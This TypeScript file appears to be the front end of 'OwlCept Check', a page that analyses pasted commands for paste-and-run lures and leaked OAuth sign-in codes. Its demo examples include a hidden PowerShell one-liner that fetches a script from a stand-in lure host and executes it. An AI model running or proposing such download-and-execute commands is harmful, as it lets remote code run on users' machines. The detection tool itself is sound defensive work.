// OwlCept Check: paste a command, see what it would really do. Everything
// runs here in the page; the Content-Security-Policy forbids network access.

import { analyze, detectOAuthCode, explain, explainConsentFix } from '@owlcept/engine';
import type { AnalyzeContext, Lang, PasteTarget } from '@owlcept/engine';
import { STRINGS, type PageStrings } from './strings.ts';

const EXAMPLES: Record<string, string> = {
  installer: 'irm get.scoop.sh | iex',
  suspicious: 'powershell -w hidden -c "iwr https://example-lure.test/a.ps1 | iex"',
  signin: 'http://localhost:8400/?code=0.AXEAdemo-not-a-real-code-0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&state=demo',
};

const $ = <T extends Element>(sel: string) => document.querySelector<T>(sel)!;
const textEl = $<HTMLTextAreaElement>('#text');
const targetEl = $<HTMLSelectElement>('#target');
const lureEl = $<HTMLInputElement>('#lure');
const resultEl = $<HTMLElement>('#result');

let lang: Lang = initialLang();
/** The Android app loads the page with ?app=android. */
const inApp = new URLSearchParams(location.search).get('app') === 'android';

function initialLang(): Lang {
  try {
    const saved = localStorage.getItem('owlcept-lang');
    if (saved === 'en' || saved === 'hi' || saved === 'kn') return saved;
  } catch {
    /* storage unavailable */
  }
  const nav = navigator.language.toLowerCase();
  return nav.startsWith('hi') ? 'hi' : nav.startsWith('kn') ? 'kn' : 'en';
}

function setLang(next: Lang): void {
  lang = next;
  try {
    localStorage.setItem('owlcept-lang', next);
  } catch {
    /* storage unavailable */
  }
  document.documentElement.lang = next;
  const s = STRINGS[next];
  for (const el of document.querySelectorAll<HTMLElement>('[data-t]')) {
    const key = (inApp && el.dataset.t === 'privacy' ? 'privacyApp' : el.dataset.t) as keyof PageStrings;
    el.textContent = s[key];
  }
  for (const el of document.querySelectorAll<HTMLElement>('[data-t-placeholder]')) {
    el.setAttribute('placeholder', s[el.dataset.tPlaceholder as keyof PageStrings]);
  }
  for (const b of document.querySelectorAll<HTMLButtonElement>('[data-lang]')) b.setAttribute('aria-pressed', String(b.dataset.lang === next));
  render();
}

function el(tag: string, cls?: string, text?: string): HTMLElement {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (text !== undefined) e.textContent = text;
  return e;
}

function render(): void {
  const s = STRINGS[lang];
  const text = textEl.value;
  resultEl.textContent = '';

  if (!text.trim()) {
    resultEl.append(el('div', 'verdict empty', s.empty));
    return;
  }

  // ConsentFix: a sign-in code is never something to paste into a website or a command.
  const code = detectOAuthCode(text);
  if (code) {
    const c = explainConsentFix(code, lang);
    const box = el('div', 'verdict block');
    box.append(el('h2', '', c.headline));
    const ul = el('ul');
    ul.append(el('li', '', c.detail));
    box.append(ul, el('p', 'advice', c.advice));
    resultEl.append(box);
    return;
  }

  const ctx: AnalyzeContext = { target: targetEl.value as PasteTarget };
  if (lureEl.checked) ctx.custody = { scriptWritten: true, lureWords: ['Win+R', 'Ctrl+V'] };
  const verdict = analyze(text, ctx);
  // The person pasted this here themselves, so "the page wrote your clipboard" does not apply.
  const e = explain({ ...verdict, findings: verdict.findings.filter((f) => f.id !== 'script-copy') }, ctx.custody, lang);

  const box = el('div', `verdict ${verdict.action}`);
  box.append(el('h2', '', verdict.action === 'allow' && verdict.findings.length === 0 ? s.nothing : e.headline));
  if (e.details.length) {
    const ul = el('ul');
    for (const d of e.details) ul.append(el('li', '', d));
    box.append(ul);
  }
  box.append(el('p', 'advice', verdict.action === 'allow' ? s.safeNote : e.advice));

  const meter = el('div', 'meter');
  const bar = el('div', 'bar');
  const fill = el('div', 'fill');
  fill.style.width = `${Math.max(3, verdict.risk)}%`;
  bar.append(fill);
  meter.append(el('span', '', s.risk), bar, el('span', '', `${verdict.risk}/100`));
  box.append(meter);

  if (verdict.hosts.length) {
    const d = el('details') as HTMLDetailsElement;
    d.open = verdict.action !== 'allow';
    d.append(el('summary', '', s.contacts));
    const chips = el('div', 'chips');
    for (const h of verdict.hosts) chips.append(el('span', 'chip', h));
    d.append(chips);
    box.append(d);
  }

  const hidden = verdict.layers.slice(1);
  if (hidden.length) {
    const d = el('details') as HTMLDetailsElement;
    d.open = true;
    d.append(el('summary', '', s.hidden));
    for (const layer of hidden) d.append(el('pre', '', layer));
    box.append(d);
  }

  resultEl.append(box);
}

let timer: ReturnType<typeof setTimeout> | undefined;
textEl.addEventListener('input', () => {
  clearTimeout(timer);
  timer = setTimeout(render, 120);
});
targetEl.addEventListener('change', render);
lureEl.addEventListener('change', render);
for (const b of document.querySelectorAll<HTMLButtonElement>('[data-lang]')) b.addEventListener('click', () => setLang(b.dataset.lang as Lang));
for (const b of document.querySelectorAll<HTMLButtonElement>('[data-example]')) {
  b.addEventListener('click', () => {
    textEl.value = EXAMPLES[b.dataset.example!];
    render();
  });
}

/** Entry point for wrappers (the Android app passes shared or selected text here). */
(window as unknown as { owlceptCheck: (text: string, target?: PasteTarget) => void }).owlceptCheck = (text, target) => {
  textEl.value = text;
  if (target) targetEl.value = target;
  render();
  resultEl.scrollIntoView({ block: 'start', behavior: 'smooth' });
};

setLang(lang);
